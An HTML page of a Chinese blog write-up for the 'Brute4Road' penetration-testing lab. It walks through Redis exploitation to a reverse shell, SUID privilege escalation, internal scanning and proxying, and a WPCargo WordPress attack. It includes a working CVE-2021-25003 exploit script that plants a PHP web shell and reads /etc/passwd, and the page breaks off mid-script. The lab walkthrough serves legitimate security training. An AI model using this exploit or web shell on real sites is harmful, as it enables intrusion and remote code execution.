@@ -1,0 +1,959 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
+  <link rel="icon" href="/img/favicon.jpg">
+  
+    <link rel="canonical" href="https://www.dr0n.top/posts/7d7c5c9c/"/>
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="dr0n">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Brute4Road是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。  前置知识: 内网渗透学习(代理篇)linux提权笔记windows提权笔记内网渗透学习(Kerberos篇)  入口（172.22.2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云境 Brute4Road">
+<meta property="og:url" content="https://www.dr0n.top/posts/7d7c5c9c/index.html">
+<meta property="og:site_name" content="Dr0n&#39;s blog">
+<meta property="og:description" content="Brute4Road是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。  前置知识: 内网渗透学习(代理篇)linux提权笔记windows提权笔记内网渗透学习(Kerberos篇)  入口（172.22.2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-1.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-2.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-3.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-4.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-5.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-6.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-7.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-8.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-9.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-10.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-11.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-12.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-14.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-13.png">
+<meta property="article:published_time" content="2025-10-29T09:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-04T15:49:21.102Z">
+<meta property="article:author" content="dr0n">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="春秋云境">
+<meta property="article:tag" content="专业徽章">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-1.png">
+  
+  
+  
+  <title>春秋云境 Brute4Road - Dr0n&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"e509bf56906f797e00a96ebece6ea445","google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.dr0n.top","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?e509bf56906f797e00a96ebece6ea445";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=G-456TDFZC89", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', 'G-456TDFZC89');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Dr0n&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>时间轴</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://awd.dr0n.top/" target="_self">
+                <i class="iconfont icon-docker"></i>
+                <span>awd</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-codepen-fill"></i>
+                <span>tools</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://dr0n1.github.io/CyberChef/" target="_self">
+                    
+                    <span>CyberChef</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://dr0n1.github.io/emoji-aes/" target="_self">
+                    
+                    <span>emoji-aes</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/fluid-bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云境 Brute4Road"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        dr0n
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-29 17:00" pubdate>
+          2025年10月29日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云境 Brute4Road</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>Brute4Road是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。</p>
+</blockquote>
+<p>前置知识:</p>
+<p><a href="/posts/52375b43/">内网渗透学习(代理篇)</a><br><a href="/posts/fcb3a8d7/">linux提权笔记</a><br><a href="/posts/a04618bd/">windows提权笔记</a><br><a href="/posts/dcdc9b09/">内网渗透学习(Kerberos篇)</a></p>
+<hr>
+<h1 id="入口（172-22-2-7）"><a href="#入口（172-22-2-7）" class="headerlink" title="入口（172.22.2.7）"></a>入口（172.22.2.7）</h1><p>依旧fscan</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>6379有未授权，尝试打<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">redis主从复制</a><br>反弹shell</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>redis权限，suid提权，可以用base64</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>flag01</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs applescript">[redis@centos-web01 db]$ base64 <span class="hljs-string">&quot;/home/redis/flag/flag01&quot;</span> | base64 <span class="hljs-comment">--decode</span><br>base64 <span class="hljs-string">&quot;/home/redis/flag/flag01&quot;</span> | base64 <span class="hljs-comment">--decode</span><br> ██████                    ██              ██  ███████                           ██<br>░█░░░░██                  ░██             █░█ ░██░░░░██                         ░██<br>░█   ░██  ██████ ██   ██ ██████  █████   █ ░█ ░██   ░██   ██████   ██████       ░██<br>░██████  ░░██░░█░██  ░██░░░██░  ██░░░██ ██████░███████   ██░░░░██ ░░░░░░██   ██████<br>░█░░░░ ██ ░██ ░ ░██  ░██  ░██  ░███████░░░░░█ ░██░░░██  ░██   ░██  ███████  ██░░░██<br>░█    ░██ ░██   ░██  ░██  ░██  ░██░░░░     ░█ ░██  ░░██ ░██   ░██ ██░░░░██ ░██  ░██<br>░███████ ░███   ░░██████  ░░██ ░░██████    ░█ ░██   ░░██░░██████ ░░████████░░██████<br>░░░░░░░  ░░░     ░░░░░░    ░░   ░░░░░░     ░  ░░     ░░  ░░░░░░   ░░░░░░░░  ░░░░░░ <br><br><br>flag01: flag&#123;<span class="hljs-number">68</span>ba4a2f<span class="hljs-number">-9561</span><span class="hljs-number">-46</span>b9<span class="hljs-number">-8</span>b03-d87a22290213&#125;<br><br>Congratulations! ! !<br>Guess <span class="hljs-keyword">where</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> flag?<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p>使用 netstat -ano 获取所在网段</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-4.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传fscan扫c段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">nohup</span> fscan -h 172.22.2.7/24 &gt; 1.txt &amp;<br><br><br>[redis@centos-web01 db]$ <span class="hljs-built_in">cat</span> 1.txt<br><span class="hljs-built_in">cat</span> 1.txt<br><br>   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /</span><br><span class="hljs-string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="hljs-string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="hljs-string">                     fscan version: 1.8.4</span><br><span class="hljs-string">start infoscan</span><br><span class="hljs-string">trying RunIcmp2</span><br><span class="hljs-string">The current user permissions unable to send icmp packets</span><br><span class="hljs-string">start ping</span><br><span class="hljs-string">(icmp) Target 172.22.2.18     is alive</span><br><span class="hljs-string">(icmp) Target 172.22.2.16     is alive</span><br><span class="hljs-string">(icmp) Target 172.22.2.3      is alive</span><br><span class="hljs-string">(icmp) Target 172.22.2.7      is alive</span><br><span class="hljs-string">(icmp) Target 172.22.2.34     is alive</span><br><span class="hljs-string">[*] Icmp alive hosts len is: 5</span><br><span class="hljs-string">172.22.2.3:445 open</span><br><span class="hljs-string">172.22.2.16:445 open</span><br><span class="hljs-string">172.22.2.18:445 open</span><br><span class="hljs-string">172.22.2.3:139 open</span><br><span class="hljs-string">172.22.2.16:139 open</span><br><span class="hljs-string">172.22.2.34:135 open</span><br><span class="hljs-string">172.22.2.34:139 open</span><br><span class="hljs-string">172.22.2.18:139 open</span><br><span class="hljs-string">172.22.2.3:135 open</span><br><span class="hljs-string">172.22.2.16:135 open</span><br><span class="hljs-string">172.22.2.16:80 open</span><br><span class="hljs-string">172.22.2.18:22 open</span><br><span class="hljs-string">172.22.2.7:80 open</span><br><span class="hljs-string">172.22.2.18:80 open</span><br><span class="hljs-string">172.22.2.7:22 open</span><br><span class="hljs-string">172.22.2.7:21 open</span><br><span class="hljs-string">172.22.2.7:6379 open</span><br><span class="hljs-string">172.22.2.16:1433 open</span><br><span class="hljs-string">172.22.2.34:445 open</span><br><span class="hljs-string">172.22.2.3:88 open</span><br><span class="hljs-string">[*] alive ports len is: 20</span><br><span class="hljs-string">start vulscan</span><br><span class="hljs-string">[*] NetInfo </span><br><span class="hljs-string">[*]172.22.2.16</span><br><span class="hljs-string">   [-&gt;]MSSQLSERVER</span><br><span class="hljs-string">   [-&gt;]172.22.2.16</span><br><span class="hljs-string">[*] NetInfo </span><br><span class="hljs-string">[*]172.22.2.3</span><br><span class="hljs-string">   [-&gt;]DC</span><br><span class="hljs-string">   [-&gt;]172.22.2.3</span><br><span class="hljs-string">[*] WebTitle http://172.22.2.16        code:404 len:315    title:Not Found</span><br><span class="hljs-string">[*] NetInfo </span><br><span class="hljs-string">[*]172.22.2.34</span><br><span class="hljs-string">   [-&gt;]CLIENT01</span><br><span class="hljs-string">   [-&gt;]172.22.2.34</span><br><span class="hljs-string">[*] OsInfo 172.22.2.3   (Windows Server 2016 Datacenter 14393)</span><br><span class="hljs-string">[*] NetBios 172.22.2.34     XIAORANG\CLIENT01             </span><br><span class="hljs-string">[*] OsInfo 172.22.2.16  (Windows Server 2016 Datacenter 14393)</span><br><span class="hljs-string">[*] WebTitle http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS</span><br><span class="hljs-string">[*] NetBios 172.22.2.3      [+] DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class="hljs-string">[*] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class="hljs-string">[*] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        </span><br><span class="hljs-string">[+] ftp 172.22.2.7:21:anonymous </span><br><span class="hljs-string">   [-&gt;]pub</span><br><span class="hljs-string">[*] WebTitle http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点</span><br><span class="hljs-string">已完成 20/20</span><br><span class="hljs-string">[*] 扫描结束,耗时: 12.660045085s</span><br></code></pre></td></tr></table></figure>
+
+<p>一共五台机器</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">172.22.2.7      入口redis<br>172.22.2.18     wordpress<br>172.22.2.3      域控<br>172.22.2.16     mssql<br>172.22.2.34<br></code></pre></td></tr></table></figure>
+
+
+
+<p>挂socks代理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">nohup</span> ./iox proxy -l 6666 &amp;<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="WordPress（172-22-2-18）"><a href="#WordPress（172-22-2-18）" class="headerlink" title="WordPress（172.22.2.18）"></a>WordPress（172.22.2.18）</h2><p>wpscan扫一下WordPress站点</p>
+<p><code>proxychains4 wpscan --url http://172.22.2.18/ --api-token xxx</code></p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-5.png" srcset="/img/loading.gif" lazyload></p>
+<p>WPCargo这个插件有<a target="_blank" rel="noopener" href="https://github.com/biulove0x/CVE-2021-25003">nday</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># @author : biulove0x</span><br><span class="hljs-comment"># @name   : WP Plugins WPCargo Exploiter</span><br><br><span class="hljs-comment">## This is a magic string that when treated as pixels and compressed using the png</span><br><span class="hljs-comment">## algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span><br><span class="hljs-comment">## payload = &#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span><br><span class="hljs-comment">## def encode_character_code(c: int):</span><br><span class="hljs-comment">##     return &#x27;&#123;:08b&#125;&#x27;.format(c).replace(&#x27;0&#x27;, &#x27;x&#x27;)</span><br><span class="hljs-comment">## text = &#x27;&#x27;.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]</span><br><br><span class="hljs-comment"># References : https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a</span><br><br><span class="hljs-keyword">from</span> urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning<br><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> requests, re, argparse<br><br><span class="hljs-built_in">print</span>(<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">############################################</span><br><span class="hljs-string"># @author : biulove0x                      #</span><br><span class="hljs-string"># @name   : WP Plugins WPCargo Exploiter   #</span><br><span class="hljs-string"># @cve    : CVE-2021-25003                 #</span><br><span class="hljs-string">############################################</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wpcargo</span>(<span class="hljs-params">_target, _timeout=<span class="hljs-number">5</span></span>):<br>    _payload  = <span class="hljs-string">&#x27;x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx&#x27;</span><br>    _endpoint = <span class="hljs-string">&#x27;wp-content/plugins/wpcargo/includes/barcode.php?text=&#x27;</span>+ _payload +<span class="hljs-string">&#x27;&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=../../../wp-conf.php&#x27;</span><br>    _sessionget = requests.Session()<br>    _headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36&#x27;</span><br>    &#125;<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">save_result</span>(<span class="hljs-params">_result</span>):<br>        _saved = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;RESULT-WPCRGO.txt&#x27;</span>, <span class="hljs-string">&#x27;a+&#x27;</span>)<br>        _saved.write(_result + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <br>    <span class="hljs-keyword">try</span>:<br>        _sessionget.get(url=_target + _endpoint, headers=_headers, allow_redirects=<span class="hljs-literal">True</span>, timeout=_timeout)<br>        _validationshell = _sessionget.post(url=_target + <span class="hljs-string">&#x27;wp-content/wp-conf.php?1=system&#x27;</span>, headers=_headers, allow_redirects=<span class="hljs-literal">True</span>, data=&#123;<span class="hljs-string">&quot;2&quot;</span>: <span class="hljs-string">&quot;cat /etc/passwd&quot;</span>&#125;, timeout=_timeout)<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;root:x:0:0:root&#x27;</span> <span class="hljs-keyword">in</span> _validationshell.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] &#x27;</span> + _target + <span class="hljs-string">&#x27;wp-content/wp-conf.php =&gt; Uploaded!&#x27;</span>)<br>            save_result(_target + <span class="hljs-string">&#x27;wp-content/wp-conf.php?1=system&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] &#x27;</span> + _target + <span class="hljs-string">&#x27; Not found!&#x27;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[%] &#x27;</span> + _target + <span 